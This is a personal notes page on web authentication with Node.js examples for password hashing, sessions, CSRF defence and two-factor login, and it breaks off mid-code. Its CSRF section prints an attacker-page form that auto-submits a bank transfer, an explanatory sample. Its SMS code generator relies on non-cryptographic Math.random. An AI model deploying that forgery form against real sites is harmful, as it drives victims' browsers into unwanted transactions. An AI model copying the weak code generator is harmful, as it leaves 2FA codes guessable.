<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Auth - My Notes</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon-de23e50b.svg">
        <link rel="shortcut icon" href="../favicon-8114d1fc.png">
        <link rel="stylesheet" href="../css/variables-8adf115d.css">
        <link rel="stylesheet" href="../css/general-2459343d.css">
        <link rel="stylesheet" href="../css/chrome-ae938929.css">
        <link rel="stylesheet" href="../css/print-9e4910d8.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../fonts/fonts-9644e21d.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="mdbook-highlight-css" href="../highlight-493f70e1.css">
        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="../tomorrow-night-4c0ae647.css">
        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="../ayu-highlight-3fdfc3ac.css">

        <!-- Custom theme stylesheets -->

        <!-- MathJax -->
        <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "../";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "../searchindex-5e706ac8.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc-82510463.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="mdbook-body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="mdbook-page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="mdbook-menu-bar-hover-placeholder"></div>
                <div id="mdbook-menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                        </label>
                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                        </button>
                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                        </ul>
                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                        </button>
                    </div>

                    <h1 class="menu-title">My Notes</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
                        </a>

                    </div>
                </div>

                <div id="mdbook-search-wrapper" class="hidden">
                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                            </div>
                        </div>
                    </form>
                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
                        <ul id="mdbook-searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="mdbook-content" class="content">
                    <main>
                        <h1 id="authentication"><a class="header" href="#authentication">Authentication</a></h1>
<p>Authentication is the process of verifying the identity of a user, system, or entity. It answers the question “Who are you?” and is fundamental to security in modern applications.</p>
<h2 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h2>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#authentication-vs-authorization">Authentication vs Authorization</a></li>
<li><a href="#authentication-methods">Authentication Methods</a></li>
<li><a href="#password-based-authentication">Password-Based Authentication</a></li>
<li><a href="#session-management">Session Management</a></li>
<li><a href="#multi-factor-authentication">Multi-Factor Authentication</a></li>
<li><a href="#token-based-authentication">Token-Based Authentication</a></li>
<li><a href="#oauth-20-and-openid-connect">OAuth 2.0 and OpenID Connect</a></li>
<li><a href="#single-sign-on-sso">Single Sign-On (SSO)</a></li>
<li><a href="#biometric-authentication">Biometric Authentication</a></li>
<li><a href="#authentication-patterns">Authentication Patterns</a></li>
<li><a href="#authorization">Authorization</a></li>
<li><a href="#security-best-practices">Security Best Practices</a></li>
<li><a href="#common-vulnerabilities">Common Vulnerabilities</a></li>
</ul>
<hr>
<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
<p><strong>What is Authentication?</strong></p>
<p>Authentication is the process of verifying that someone or something is who they claim to be. It establishes trust between systems and users by validating credentials before granting access to resources.</p>
<p><strong>Key Concepts:</strong></p>
<ul>
<li><strong>Identity</strong>: Who or what is requesting access</li>
<li><strong>Credentials</strong>: Information used to prove identity</li>
<li><strong>Verification</strong>: Process of validating credentials</li>
<li><strong>Trust</strong>: Confidence that authentication is reliable</li>
</ul>
<p><strong>Common Use Cases:</strong></p>
<ul>
<li>User login to web applications</li>
<li>API authentication</li>
<li>Device authentication</li>
<li>Service-to-service authentication</li>
<li>Secure communications</li>
</ul>
<hr>
<h2 id="authentication-vs-authorization"><a class="header" href="#authentication-vs-authorization">Authentication vs Authorization</a></h2>
<h3 id="authentication-authn"><a class="header" href="#authentication-authn">Authentication (AuthN)</a></h3>
<p><strong>Who are you?</strong></p>
<pre><code>User claims: "I am Alice"
System verifies: Username + Password match
Result: Identity confirmed ✓
</code></pre>
<p><strong>Focus:</strong> Verifying identity</p>
<p><strong>Methods:</strong></p>
<ul>
<li>Passwords</li>
<li>Biometrics</li>
<li>Certificates</li>
<li>Tokens</li>
</ul>
<h3 id="authorization-authz"><a class="header" href="#authorization-authz">Authorization (AuthZ)</a></h3>
<p><strong>What can you do?</strong></p>
<pre><code>User: Authenticated as Alice
System checks: Alice has "admin" role
Result: Access granted to admin panel ✓
</code></pre>
<p><strong>Focus:</strong> Granting permissions</p>
<p><strong>Methods:</strong></p>
<ul>
<li>Role-Based Access Control (RBAC)</li>
<li>Attribute-Based Access Control (ABAC)</li>
<li>Access Control Lists (ACL)</li>
<li>Permissions and scopes</li>
</ul>
<h3 id="example-flow"><a class="header" href="#example-flow">Example Flow</a></h3>
<pre><code>1. Authentication: User logs in with username/password → Identity verified
2. Authorization: System checks user's role → Permissions granted
3. Access: User accesses allowed resources
</code></pre>
<hr>
<h2 id="authentication-methods"><a class="header" href="#authentication-methods">Authentication Methods</a></h2>
<h3 id="1-knowledge-based-something-you-know"><a class="header" href="#1-knowledge-based-something-you-know">1. Knowledge-Based (Something You Know)</a></h3>
<p><strong>Passwords</strong></p>
<pre><code>User: alice
Password: MySecureP@ssw0rd123
</code></pre>
<p><strong>PINs (Personal Identification Numbers)</strong></p>
<pre><code>PIN: 4-6 digit code
Used for: ATMs, mobile devices, payment systems
</code></pre>
<p><strong>Security Questions</strong></p>
<pre><code>Question: "What is your mother's maiden name?"
Answer: Used as secondary verification
</code></pre>
<h3 id="2-possession-based-something-you-have"><a class="header" href="#2-possession-based-something-you-have">2. Possession-Based (Something You Have)</a></h3>
<p><strong>Physical Tokens</strong></p>
<pre><code>- Hardware security keys (YubiKey)
- Smart cards
- RSA tokens
</code></pre>
<p><strong>Mobile Devices</strong></p>
<pre><code>- SMS codes
- Authenticator apps (Google Authenticator, Authy)
- Push notifications
</code></pre>
<p><strong>Certificates</strong></p>
<pre><code>- X.509 certificates
- Client certificates
- mTLS (Mutual TLS)
</code></pre>
<h3 id="3-inherence-based-something-you-are"><a class="header" href="#3-inherence-based-something-you-are">3. Inherence-Based (Something You Are)</a></h3>
<p><strong>Biometric Authentication</strong></p>
<pre><code>- Fingerprint
- Facial recognition
- Iris scan
- Voice recognition
- Behavioral biometrics
</code></pre>
<h3 id="4-location-based-somewhere-you-are"><a class="header" href="#4-location-based-somewhere-you-are">4. Location-Based (Somewhere You Are)</a></h3>
<p><strong>Geolocation</strong></p>
<pre><code>- IP address verification
- GPS coordinates
- Geofencing
</code></pre>
<p><strong>Network-Based</strong></p>
<pre><code>- VPN requirement
- Internal network access
- IP whitelisting
</code></pre>
<hr>
<h2 id="password-based-authentication"><a class="header" href="#password-based-authentication">Password-Based Authentication</a></h2>
<h3 id="password-storage"><a class="header" href="#password-storage">Password Storage</a></h3>
<p><strong>❌ Never Store Plain Text</strong></p>
<pre><code class="language-javascript">// WRONG - Never do this!
const user = {
  username: 'alice',
  password: 'MyPassword123'  // Plain text - terrible!
};
</code></pre>
<p><strong>✅ Use Proper Password Hashing</strong></p>
<pre><code class="language-javascript">const bcrypt = require('bcrypt');

// Hash password during registration
async function hashPassword(plainPassword) {
  const saltRounds = 12;
  const hash = await bcrypt.hash(plainPassword, saltRounds);
  return hash;
}

// Verify password during login
async function verifyPassword(plainPassword, hashedPassword) {
  const match = await bcrypt.compare(plainPassword, hashedPassword);
  return match;
}

// Example
const password = 'MySecureP@ssw0rd';
const hash = await hashPassword(password);
// $2b$12$KIXxLVq5Pq6T8xGvW5kN0OZGpJ...

// Later during login
const isValid = await verifyPassword('MySecureP@ssw0rd', hash);
// true
</code></pre>
<h3 id="argon2-modern-alternative"><a class="header" href="#argon2-modern-alternative">Argon2 (Modern Alternative)</a></h3>
<pre><code class="language-javascript">const argon2 = require('argon2');

async function hashPasswordArgon2(password) {
  try {
    const hash = await argon2.hash(password, {
      type: argon2.argon2id,
      memoryCost: 2 ** 16,  // 64 MB
      timeCost: 3,
      parallelism: 1
    });
    return hash;
  } catch (err) {
    throw new Error('Password hashing failed');
  }
}

async function verifyPasswordArgon2(password, hash) {
  try {
    return await argon2.verify(hash, password);
  } catch (err) {
    return false;
  }
}
</code></pre>
<h3 id="password-policy-implementation"><a class="header" href="#password-policy-implementation">Password Policy Implementation</a></h3>
<pre><code class="language-javascript">class PasswordValidator {
  static validate(password) {
    const errors = [];

    // Minimum length
    if (password.length &lt; 12) {
      errors.push('Password must be at least 12 characters');
    }

    // Uppercase letter
    if (!/[A-Z]/.test(password)) {
      errors.push('Password must contain uppercase letter');
    }

    // Lowercase letter
    if (!/[a-z]/.test(password)) {
      errors.push('Password must contain lowercase letter');
    }

    // Number
    if (!/\d/.test(password)) {
      errors.push('Password must contain a number');
    }

    // Special character
    if (!/[!@#$%^&amp;*(),.?":{}|&lt;&gt;]/.test(password)) {
      errors.push('Password must contain special character');
    }

    // Common password check
    const commonPasswords = ['password', '123456', 'qwerty'];
    if (commonPasswords.includes(password.toLowerCase())) {
      errors.push('Password is too common');
    }

    return {
      valid: errors.length === 0,
      errors
    };
  }
}

// Usage
const result = PasswordValidator.validate('MyP@ssw0rd123');
if (!result.valid) {
  console.error('Invalid password:', result.errors);
}
</code></pre>
<h3 id="password-reset-flow"><a class="header" href="#password-reset-flow">Password Reset Flow</a></h3>
<pre><code class="language-javascript">const crypto = require('crypto');

class PasswordResetService {
  // Generate reset token
  static generateResetToken() {
    return crypto.randomBytes(32).toString('hex');
  }

  // Create reset token with expiration
  static async createResetToken(userId) {
    const token = this.generateResetToken();
    const expires = new Date(Date.now() + 3600000); // 1 hour

    await db.passwordResets.create({
      userId,
      token: crypto.createHash('sha256').update(token).digest('hex'),
      expires
    });

    return token;
  }

  // Verify reset token
  static async verifyResetToken(token) {
    const hashedToken = crypto.createHash('sha256').update(token).digest('hex');

    const reset = await db.passwordResets.findOne({
      token: hashedToken,
      expires: { $gt: new Date() }
    });

    if (!reset) {
      throw new Error('Invalid or expired token');
    }

    return reset.userId;
  }

  // Complete password reset
  static async resetPassword(token, newPassword) {
    const userId = await this.verifyResetToken(token);
    const hashedPassword = await hashPassword(newPassword);

    await db.users.update(
      { id: userId },
      { password: hashedPassword }
    );

    // Invalidate all reset tokens for this user
    await db.passwordResets.deleteMany({ userId });

    return true;
  }
}
</code></pre>
<hr>
<h2 id="session-management"><a class="header" href="#session-management">Session Management</a></h2>
<h3 id="cookie-based-sessions"><a class="header" href="#cookie-based-sessions">Cookie-Based Sessions</a></h3>
<pre><code class="language-javascript">const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const app = express();
const redisClient = redis.createClient();

// Configure session middleware
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,      // HTTPS only
    httpOnly: true,    // Prevent XSS
    maxAge: 3600000,   // 1 hour
    sameSite: 'strict' // CSRF protection
  }
}));

// Login endpoint
app.post('/login', async (req, res) =&gt; {
  const { username, password } = req.body;

  const user = await db.users.findOne({ username });
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Create session
  req.session.userId = user.id;
  req.session.username = user.username;
  req.session.roles = user.roles;

  res.json({ message: 'Logged in successfully' });
});

// Protected route
app.get('/profile', requireAuth, (req, res) =&gt; {
  res.json({
    userId: req.session.userId,
    username: req.session.username
  });
});

// Auth middleware
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// Logout
app.post('/logout', (req, res) =&gt; {
  req.session.destroy((err) =&gt; {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('connect.sid');
    res.json({ message: 'Logged out successfully' });
  });
});
</code></pre>
<h3 id="session-storage-options"><a class="header" href="#session-storage-options">Session Storage Options</a></h3>
<p><strong>Server-Side Storage (Recommended)</strong></p>
<pre><code class="language-javascript">// Redis (recommended for distributed systems)
const RedisStore = require('connect-redis')(session);
app.use(session({
  store: new RedisStore({ client: redisClient }),
  // ... config
}));

// MongoDB
const MongoStore = require('connect-mongo');
app.use(session({
  store: MongoStore.create({ mongoUrl: 'mongodb://localhost/sessions' }),
  // ... config
}));

// PostgreSQL
const PostgresStore = require('connect-pg-simple')(session);
app.use(session({
  store: new PostgresStore({ pool: pgPool }),
  // ... config
}));

// Memory Store (development only - NOT for production)
// Default if no store specified - loses sessions on restart
</code></pre>
<p><strong>Client-Side Storage (Use with Caution)</strong></p>
<pre><code class="language-javascript">// JWT in cookies - stateless sessions
app.use(cookieParser());

function createSessionToken(user) {
  return jwt.sign(
    { userId: user.id, roles: user.roles },
    process.env.SESSION_SECRET,
    { expiresIn: '1h' }
  );
}

app.post('/login', async (req, res) =&gt; {
  // ... authenticate user ...

  const token = createSessionToken(user);

  res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  });

  res.json({ success: true });
});
</code></pre>
<h3 id="session-security"><a class="header" href="#session-security">Session Security</a></h3>
<pre><code class="language-javascript">class SessionManager {
  // Regenerate session ID after login
  static regenerateSession(req) {
    return new Promise((resolve, reject) =&gt; {
      const oldSession = req.session;
      req.session.regenerate((err) =&gt; {
        if (err) return reject(err);

        // Restore session data
        Object.assign(req.session, oldSession);
        resolve();
      });
    });
  }

  // Session timeout handling
  static checkSessionTimeout(req, res, next) {
    if (req.session.lastActivity) {
      const timeout = 30 * 60 * 1000; // 30 minutes
      const now = Date.now();

      if (now - req.session.lastActivity &gt; timeout) {
        req.session.destroy();
        return res.status(401).json({ error: 'Session expired' });
      }
    }

    req.session.lastActivity = Date.now();
    next();
  }

  // Concurrent session control
  static async checkConcurrentSessions(userId, sessionId) {
    const activeSessions = await redis.smembers(`user:${userId}:sessions`);

    // Limit to 3 concurrent sessions
    if (activeSessions.length &gt;= 3 &amp;&amp; !activeSessions.includes(sessionId)) {
      throw new Error('Maximum concurrent sessions reached');
    }
  }
}
</code></pre>
<h3 id="csrf-protection"><a class="header" href="#csrf-protection">CSRF Protection</a></h3>
<p><strong>Understanding CSRF</strong></p>
<p>Cross-Site Request Forgery attacks trick authenticated users into performing unwanted actions.</p>
<pre><code>Attacker's site:
&lt;form action="https://bank.com/transfer" method="POST"&gt;
  &lt;input name="to" value="attacker" /&gt;
  &lt;input name="amount" value="1000" /&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;

If user is logged into bank.com, this auto-submits and transfers money!
</code></pre>
<p><strong>CSRF Token Implementation</strong></p>
<pre><code class="language-javascript">const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(cookieParser());

// Generate CSRF token
app.get('/form', csrfProtection, (req, res) =&gt; {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Validate CSRF token
app.post('/process', csrfProtection, (req, res) =&gt; {
  // Token automatically validated
  res.json({ success: true });
});
</code></pre>
<p><strong>HTML Form with CSRF Token</strong></p>
<pre><code class="language-html">&lt;form action="/process" method="POST"&gt;
  &lt;input type="hidden" name="_csrf" value="&lt;%= csrfToken %&gt;" /&gt;
  &lt;input type="text" name="data" /&gt;
  &lt;button type="submit"&gt;Submit&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<p><strong>AJAX with CSRF Token</strong></p>
<pre><code class="language-javascript">// Include token in request header
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': csrfToken
  },
  body: JSON.stringify({ data: 'value' })
});
</code></pre>
<p><strong>SameSite Cookie Attribute</strong></p>
<pre><code class="language-javascript">// Modern CSRF protection - prevents cookie sending on cross-site requests
app.use(session({
  cookie: {
    sameSite: 'strict',  // or 'lax' for more flexibility
    secure: true,
    httpOnly: true
  }
}));
</code></pre>
<p><strong>Double Submit Cookie Pattern</strong></p>
<pre><code class="language-javascript">function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

app.use((req, res, next) =&gt; {
  if (!req.cookies.csrfToken) {
    const token = generateCSRFToken();
    res.cookie('csrfToken', token, {
      httpOnly: false,  // Must be readable by JavaScript
      secure: true,
      sameSite: 'strict'
    });
  }
  next();
});

app.post('/api/*', (req, res, next) =&gt; {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
});
</code></pre>
<hr>
<h2 id="multi-factor-authentication"><a class="header" href="#multi-factor-authentication">Multi-Factor Authentication</a></h2>
<h3 id="time-based-one-time-password-totp"><a class="header" href="#time-based-one-time-password-totp">Time-Based One-Time Password (TOTP)</a></h3>
<pre><code class="language-javascript">const speakeasy = require('speakeasy');
const qrcode = require('qrcode');

class TOTPService {
  // Generate secret for new user
  static generateSecret(username) {
    const secret = speakeasy.generateSecret({
      name: `MyApp (${username})`,
      length: 32
    });

    return {
      secret: secret.base32,
      qrCode: secret.otpauth_url
    };
  }

  // Generate QR code
  static async generateQRCode(otpauthUrl) {
    return await qrcode.toDataURL(otpauthUrl);
  }

  // Verify TOTP token
  static verifyToken(secret, token) {
    return speakeasy.totp.verify({
      secret,
      encoding: 'base32',
      token,
      window: 2  // Allow 2 time steps tolerance
    });
  }
}

// Enable 2FA endpoint
app.post('/auth/2fa/enable', requireAuth, async (req, res) =&gt; {
  const userId = req.session.userId;
  const user = await db.users.findById(userId);

  // Generate secret
  const { secret, qrCode } = TOTPService.generateSecret(user.username);

  // Store secret temporarily
  await db.users.update(
    { id: userId },
    { totpSecretTemp: secret }
  );

  // Generate QR code
  const qrCodeImage = await TOTPService.generateQRCode(qrCode);

  res.json({ qrCode: qrCodeImage, secret });
});

// Verify and activate 2FA
app.post('/auth/2fa/verify', requireAuth, async (req, res) =&gt; {
  const { token } = req.body;
  const userId = req.session.userId;

  const user = await db.users.findById(userId);

  // Verify token
  const isValid = TOTPService.verifyToken(user.totpSecretTemp, token);

  if (!isValid) {
    return res.status(400).json({ error: 'Invalid token' });
  }

  // Activate 2FA
  await db.users.update(
    { id: userId },
    {
      totpSecret: user.totpSecretTemp,
      totpSecretTemp: null,
      twoFactorEnabled: true
    }
  );

  res.json({ message: '2FA enabled successfully' });
});

// Login with 2FA
app.post('/auth/login', async (req, res) =&gt; {
  const { username, password, token } = req.body;

  const user = await db.users.findOne({ username });

  // Verify password
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Check if 2FA is enabled
  if (user.twoFactorEnabled) {
    if (!token) {
      return res.status(200).json({
        requiresTwoFactor: true
      });
    }

    // Verify TOTP token
    const isValid = TOTPService.verifyToken(user.totpSecret, token);
    if (!isValid) {
      return res.status(401).json({ error: 'Invalid 2FA token' });
    }
  }

  // Create session
  req.session.userId = user.id;
  res.json({ message: 'Logged in successfully' });
});
</code></pre>
<h3 id="sms-based-2fa"><a class="header" href="#sms-based-2fa">SMS-Based 2FA</a></h3>
<pre><code class="language-javascript">const twilio = require('twilio');

class SMSAuthService {
  constructor() {
    this.client = twilio(
      process.env.TWILIO_ACCOUNT_SID,
      process.env.TWILIO_AUTH_TOKEN
    );
  }

  // Generate 6-digit code
  generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
  }

  // Send SMS code
  async sendCode(phoneNumber, code) {
    await this.client.messages.create({
      body: `Your verification code is: ${code}`,
      from: process.env.TWILIO_PHONE_NUMBER,
      to: phoneNumber
    });
  }

  // Store code with expiration
  async storeCode(userId, code) {
    const expires = Date.now() + 5 * 60 * 1000; // 5 minutes

    await redis.setex(
      `sms:${userId}`,
      300,  // 5 minutes TTL
      JSON.stringify({ code, expires })
    );
  }

  // Verify code
  async verifyCode(userId, submittedCode) {
    const data = await redis.get(`sms:${userId}`);

    if (!data) {
      throw new Error('Code expired or not found');
    }

    const { code, expires } = JSON.parse(data);

    if (Date.now() &gt; expires) {
      await redis.del(`sms:${userId}`);
      throw new Error('Code expired');
    }

    if (code !== submittedCode) {
      throw new Error('Invalid code');
    }

    // Delete code after successful verification
    await redis.del(`sms:${userId}`);
    return true;
  }
}
</code></pre>
<h3 id="backup-codes"><a class="header" href="#backup-codes">Backup Codes</a></h3>
<pre><code class="language-javascript">class BackupCodeService {
  // Generate backup codes
  static generateBackupCodes(count = 10) {
    const codes = [];
    for (let i = 0; i &lt; count; i++) {
      const code = crypto.randomBytes(4).toString('hex').toUpperCase();
      codes.push(code);
    }
    return codes;
  }

  // Hash backup codes before storage
  static async hashCodes(codes) {
    const hashed = [];
    for (const code of codes) {
      const hash = crypto.createHash('sha256').update(code).digest('hex');
